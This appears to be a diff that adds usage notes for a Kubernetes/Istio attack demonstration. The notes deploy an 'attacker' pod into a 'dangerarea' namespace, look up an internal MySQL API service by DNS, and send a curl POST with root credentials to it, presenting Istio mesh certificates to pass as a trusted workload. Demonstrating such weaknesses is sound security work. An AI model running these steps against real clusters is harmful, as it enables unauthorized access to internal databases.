@@ -1,0 +1,7 @@
+# Usage
+  *) edit attacker.yaml to use istio certificates
+  kubectl apply -f attacker.yaml
+  kubectl exec -it attacker bash -n dangerarea
+  nslookup mysql-apiserver.default.svc.cluster.local 10.96.0.10
+  *) save ip address as <svc-ip>
+  curl -k -XPOST https://<svc-ip>:4567/api -d '{"user":"root", "password":"password"}' --key /etc/certs/key.pem  --cert /etc/certs/cert-chain.pem
